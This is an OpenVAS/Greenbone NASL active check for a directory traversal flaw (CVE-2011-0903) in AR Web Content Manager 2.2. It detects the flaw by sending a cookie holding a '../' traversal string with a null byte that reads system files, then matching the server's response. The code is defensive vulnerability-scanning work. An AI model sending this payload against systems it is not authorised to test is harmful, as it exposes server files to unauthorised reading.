# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902338");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)");
  script_cve_id("CVE-2011-0903");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("AR Web Content Manager <= 2.2 Multiple Directory Traversal Vulnerabilities - Active Check");
  script_xref(name:"URL", value:"https://exchange.xforce.ibmcloud.com/vulnerabilities/64980");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121211218/http://www.securityfocus.com/bid/46017");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/16049");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"The flaw exists due to an error in 'index.php' and 'header.php'
  scripts, which allows to read arbitrary files via a .. (dot dot) in the
  'awcm_theme' or 'awcm_lang' cookies.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"AR Web Content Manager (AWCM) is prone to multiple directory
  traversal vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
  potentially sensitive information and execute arbitrary local scripts in the
  context of the web server process.");

  script_tag(name:"affected", value:"AR Web Content Manager (AWCM) version 2.2 and probably
  prior.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

useragent = http_get_user_agent();
files = traversal_files();
host = http_host_name(port:port);

foreach dir(make_list_unique("/awcm", "/AWCM", http_cgi_dirs(port:port))) {

  if(dir == "/") dir = "";

  res = http_get_cache(item:dir + "/index.php", port:port);
  if(">AWCM" >< res) {

    foreach pattern(keys(files)) {

      file = files[pattern];
      exp = "../../../../../../../../../../" + file + "%00";

      url = string(dir + "/index.php");
      req2 = string("GET ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", useragent, "\r\n",
                    "Cookie: awcm_lang=", exp, "\r\n\r\n");
      res2 = http_keepalive_send_recv(port:port, data:req2);

      if(egrep(string: res2, pattern: pattern, icase: TRUE)) {
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
